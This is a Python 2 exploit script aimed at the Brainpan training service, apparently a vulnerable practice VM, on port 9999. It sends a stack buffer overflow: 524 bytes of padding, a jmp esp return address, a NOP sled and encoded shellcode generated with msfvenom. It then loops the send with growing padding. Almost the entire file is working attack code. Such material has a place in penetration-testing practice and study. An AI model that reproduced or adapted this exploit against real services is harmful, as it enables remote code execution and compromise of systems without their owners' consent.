#!/usr/bin/python
import socket
import time
import sys
from struct import *

rhost = '172.16.16.202' # BrainPan IP
rport = 9999 #BrainPan Port
size = 100
offset = 'A' * 524
#jmp esp 311712F3
eip = pack('<L',0x311712F3)
#You need to generate your own msfvenom and replace esp
esp =  b"\x90" * 8
esp += b"\xdd\xc3\xbf\xbd\x8f\x2f\x43\xd9\x74\x24\xf4\x5a\x31"
esp += b"\xc9\xb1\x52\x31\x7a\x17\x03\x7a\x17\x83\x57\x73\xcd"
esp += b"\xb6\x5b\x64\x90\x39\xa3\x75\xf5\xb0\x46\x44\x35\xa6"
esp += b"\x03\xf7\x85\xac\x41\xf4\x6e\xe0\x71\x8f\x03\x2d\x76"
esp += b"\x38\xa9\x0b\xb9\xb9\x82\x68\xd8\x39\xd9\xbc\x3a\x03"
esp += b"\x12\xb1\x3b\x44\x4f\x38\x69\x1d\x1b\xef\x9d\x2a\x51"
esp += b"\x2c\x16\x60\x77\x34\xcb\x31\x76\x15\x5a\x49\x21\xb5"
esp += b"\x5d\x9e\x59\xfc\x45\xc3\x64\xb6\xfe\x37\x12\x49\xd6"
esp += b"\x09\xdb\xe6\x17\xa6\x2e\xf6\x50\x01\xd1\x8d\xa8\x71"
esp += b"\x6c\x96\x6f\x0b\xaa\x13\x6b\xab\x39\x83\x57\x4d\xed"
esp += b"\x52\x1c\x41\x5a\x10\x7a\x46\x5d\xf5\xf1\x72\xd6\xf8"
esp += b"\xd5\xf2\xac\xde\xf1\x5f\x76\x7e\xa0\x05\xd9\x7f\xb2"
esp += b"\xe5\x86\x25\xb9\x08\xd2\x57\xe0\x44\x17\x5a\x1a\x95"
esp += b"\x3f\xed\x69\xa7\xe0\x45\xe5\x8b\x69\x40\xf2\xec\x43"
esp += b"\x34\x6c\x13\x6c\x45\xa5\xd0\x38\x15\xdd\xf1\x40\xfe"
esp += b"\x1d\xfd\x94\x51\x4d\x51\x47\x12\x3d\x11\x37\xfa\x57"
esp += b"\x9e\x68\x1a\x58\x74\x01\xb1\xa3\x1f\x82\x56\xbb\x13"
esp += b"\xb2\x54\xbb\xbb\xa2\xd0\x5d\xd1\x34\xb5\xf6\x4e\xac"
esp += b"\x9c\x8c\xef\x31\x0b\xe9\x30\xb9\xb8\x0e\xfe\x4a\xb4"
esp += b"\x1c\x97\xba\x83\x7e\x3e\xc4\x39\x16\xdc\x57\xa6\xe6"
esp += b"\xab\x4b\x71\xb1\xfc\xba\x88\x57\x11\xe4\x22\x45\xe8"
esp += b"\x70\x0c\xcd\x37\x41\x93\xcc\xba\xfd\xb7\xde\x02\xfd"
esp += b"\xf3\x8a\xda\xa8\xad\x64\x9d\x02\x1c\xde\x77\xf8\xf6"
esp += b"\xb6\x0e\x32\xc9\xc0\x0e\x1f\xbf\x2c\xbe\xf6\x86\x53"
esp += b"\x0f\x9f\x0e\x2c\x6d\x3f\xf0\xe7\x35\x4f\xbb\xa5\x1c"
esp += b"\xd8\x62\x3c\x1d\x85\x94\xeb\x62\xb0\x16\x19\x1b\x47"
esp += b"\x06\x68\x1e\x03\x80\x81\x52\x1c\x65\xa5\xc1\x1d\xac"
buffer =  offset + eip + esp

while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((rhost,rport))
    except:
        print "--------------------------------------"
        sys.exit(1)
    #print "Buffer size: " + str(size)
    s.send('' + buffer + '\r\n')
    time.sleep(1)
    size += 100
    s.close()
    buffer += "B" * size

